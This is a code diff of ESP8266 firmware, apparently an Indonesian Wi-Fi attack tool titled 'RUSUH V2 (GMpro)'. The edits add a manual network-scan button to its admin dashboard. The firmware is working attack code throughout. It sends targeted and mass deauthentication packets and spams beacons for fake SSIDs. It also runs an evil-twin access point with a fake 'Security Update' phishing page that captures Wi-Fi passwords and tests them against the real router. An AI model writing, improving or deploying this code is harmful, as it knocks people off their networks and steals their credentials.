@@ -32,7 +32,6 @@ bool deauth_target_active = false;
 bool beacon_spam_active = false;
 
 unsigned long last_attack = 0;
-unsigned long scan_now = 0;
 
 const char* fake_ssids_50[] = {
   "iPhone 13", "AndroidAP_9921", "Xiaomi Mi 11", "Galaxy S21 Ultra", "OPPO A95", 
@@ -64,7 +63,7 @@ String loadPassword() {
   return pw;
 }
 
-// --- ENGINE ---
+// --- ATTACK ENGINE ---
 void sendPkt(uint8_t* buf, uint16_t len) {
   if (wifi_send_pkt_freedom(buf, len, 0) == 0) _pktCount++;
   yield();
@@ -93,20 +92,32 @@ void sendBeacon(const char* ssid) {
   sendPkt(packet, pos);
 }
 
-// --- WEB UI ---
+// --- ADMIN DASHBOARD ---
 void handleAdmin() {
+  if (webServer.hasArg("scan")) {
+    _lastLog = "Scanning WiFi...";
+    int n = WiFi.scanNetworks();
+    for (int i = 0; i < n && i < 16; ++i) {
+      _networks[i].ssid = WiFi.SSID(i);
+      _networks[i].ch = WiFi.channel(i);
+      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
+    }
+    _lastLog = "Scan Berhasil (" + String(n) + " ditemukan)";
+  }
+
   if (webServer.hasArg("ap")) {
     int idx = webServer.arg("ap").toInt();
     if(idx >= 0 && idx < 16) {
       _selectedNetwork = _networks[idx];
-      _lastLog = "Locked: " + _selectedNetwork.ssid;
+      _lastLog = "Terkunci: " + _selectedNetwork.ssid;
     }
   }
-  if (webServer.hasArg("deauth")) { deauth_target_active = (webServer.arg("deauth") == "1"); _pktCount = 0; }
-  if (webServer.hasArg("kill")) { mass_kill_active = (webServer.arg("kill") == "1"); _pktCount = 0; }
-  if (webServer.hasArg("spam")) { beacon_spam_active = (webServer.arg("spam") == "1"); _pktCount = 0; }
-  if (webServer.hasArg("stop")) { deauth_target_active = mass_kill_active = beacon_spam_active = hotspot_active = false; _lastLog = "All Stopped"; }
-  if (webServer.hasArg("clear")) { for (int i = 0; i < 512; i++) EEPROM.write(i, 0); EEPROM.commit(); _correct = ""; }
+
+  if (webServer.hasArg("deauth")) { deauth_target_active = (webServer.arg("deauth") == "1"); _pktCount = 0; if(deauth_target_active) _lastLog = "Deauthing " + _selectedNetwork.ssid; }
+  if (webServer.hasArg("kill")) { mass_kill_active = (webServer.arg("kill") == "1"); _pktCount = 0; if(mass_kill_active) _lastLog = "Mass Killing Active"; }
+  if (webServer.hasArg("spam")) { beacon_spam_active = (webServer.arg("spam") == "1"); _pktCount = 0; if(beacon_spam_active) _lastLog = "SSID Spamming Active"; }
+  if (webServer.hasArg("stop")) { deauth_target_active = mass_kill_active = beacon_spam_active = hotspot_active = false; _lastLog = "Serangan Berhenti"; }
+  if (webServer.hasArg("clear")) { for (int i = 0; i < 512; i++) EEPROM.write(i, 0); EEPROM.commit(); _correct = ""; _lastLog = "Data Dihapus"; }
   
   if (webServer.hasArg("hotspot")) {
     hotspot_active = (webServer.arg("hotspot") == "1");
@@ -114,18 +125,18 @@ void handleAdmin() {
       WiFi.softAPdisconnect(true);
       WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
-      _lastLog = "Evil Twin Active";
+      _lastLog = "Evil Twin Aktif";
     } else {
       hotspot_active = false;
       WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
+      _lastLog = "Admin Mode On";
     }
   }
 
-  // UI PERMANEN (Sesuai Request)
   String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
   h += "body{background:#000;color:#fff;font-family:sans-serif;padding:10px;margin:0;}h2{color:#00d4ff;border-bottom:2px solid #222;padding-bottom:10px;}";
-  h += "button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-weight:bold;color:#fff;cursor:pointer;text-transform:uppercase;transition:0.2s;}";
-  h += ".r{background:#f44336;}.p{background:#9c27b0;}.b{background:#2196f3;}.g{background:#444;}.y{background:#ffa000;}";
+  h += "button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-weight:bold;color:#fff;cursor:pointer;text-transform:uppercase;}";
+  h += ".r{background:#f44336;}.p{background:#9c27b0;}.b{background:#2196f3;}.g{background:#444;}.y{background:#ffa000;}.s{background:#00c853;}";
   h += ".active{border:2px solid #fff;box-shadow:0 0 15px #fff;}.result-box{background:#2e7d32;padding:12px;border-radius:5px;margin-bottom:15px;display:flex;justify-content:space-between;align-items:center;}";
   h += ".log{background:#111;color:#0f0;padding:10px;font-family:monospace;font-size:12px;margin:10px 0;border:1px solid #333;border-radius:5px;}";
   h += "table{width:100%;border-collapse:collapse;margin-top:15px;}th,td{padding:10px;border-bottom:1px solid #333;text-align:left;font-size:13px;}th{background:#111;color:#00d4ff;}";
@@ -133,7 +144,7 @@ void handleAdmin() {
   
   h += "<h2>RUSUH V2 (GMpro)</h2>";
   if(_correct != "") h += "<div class='result-box'><span>RESULT: <b>"+_correct+"</b></span><button class='y' style='width:auto;padding:5px 10px;' onclick=\"location.href='/?clear=1'\">HAPUS</button></div>";
-  h += "<p>Target Terkunci: <b>"+_selectedNetwork.ssid+"</b></p>";
+  h += "<p>Target: <b>"+_selectedNetwork.ssid+"</b></p>";
   
   h += "<button class='r "+String(deauth_target_active?"active":"")+"' onclick=\"location.href='/?deauth="+(deauth_target_active?"0":"1")+"'\">DEAUTH TARGET</button>";
   h += "<button class='r "+String(mass_kill_active?"active":"")+"' onclick=\"location.href='/?kill="+(mass_kill_active?"0":"1")+"'\">MASS KILL ALL</button>";
@@ -144,6 +155,8 @@ void handleAdmin() {
   h += "<button class='b "+String(hotspot_active?"active":"")+"' onclick=\"location.href='/?hotspot="+(hotspot_active?"0":"1")+"'\">EVIL TWIN</button>";
   h += "<button class='g' onclick=\"location.href='/?stop=1'\">🛑 STOP ALL ATTACKS</button>";
   
+  h += "<button class='s' onclick=\"location.href='/?scan=1'\">🔍 SCAN WIFI SEKITAR</button>";
+
   h += "<table><thead><tr><th>SSID</th><th>CH</th><th>AKSI</th></tr></thead><tbody>";
   for(int i=0; i<16; i++){
     if(_networks[i].ssid == "") break;
@@ -167,12 +180,10 @@ void setup() {
     if (hotspot_active) {
       if (webServer.hasArg("password")) {
         _tryPassword = webServer.arg("password");
-        _lastLog = "Validating Password...";
-        // LOGIC PASS VALID: Coba konek ke router asli
         WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
         webServer.send(200, "text/html", "Verifying... <script>setTimeout(function(){location.href='/check';},5000);</script>");
       } else {
-        webServer.send(200, "text/html", "<html><body style='font-family:sans-serif;padding:20px;background:#000;color:#fff;'><h2>Security Update</h2><p>Please enter password for <b>"+_selectedNetwork.ssid+"</b> to continue.</p><form method='post'><input type='password' name='password' style='width:100%;padding:10px;' placeholder='WiFi Password'><br><br><input type='submit' value='CONNECT' style='width:100%;padding:10px;background:#2196f3;color:#fff;border:none;'></form></body></html>");
+        webServer.send(200, "text/html", "<html><body style='font-family:sans-serif;padding:20px;background:#000;color:#fff;'><h2>Security Update</h2><p>Verifikasi untuk <b>"+_selectedNetwork.ssid+"</b></p><form method='post'><input type='password' name='password' style='width:100%;padding:10px;' placeholder='Masukkan Password WiFi'><br><br><input type='submit' value='UPDATE' style='width:100%;padding:10px;background:#2196f3;color:#fff;border:none;'></form></body></html>");
       }
     } else { handleAdmin(); }
   });
@@ -203,15 +214,5 @@ void loop() {
       for (int i = 0; i < 50; i++) sendBeacon(fake_ssids_50[i]);
     }
     last_attack = millis();
-  }
-
-  if (millis() - scan_now > 15000 && !mass_kill_active && !hotspot_active && !deauth_target_active) {
-    int n = WiFi.scanNetworks();
-    for (int i = 0; i < n && i < 16; ++i) {
-      _networks[i].ssid = WiFi.SSID(i);
-      _networks[i].ch = WiFi.channel(i);
-      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
-    }
-    scan_now = millis();
   }
 }
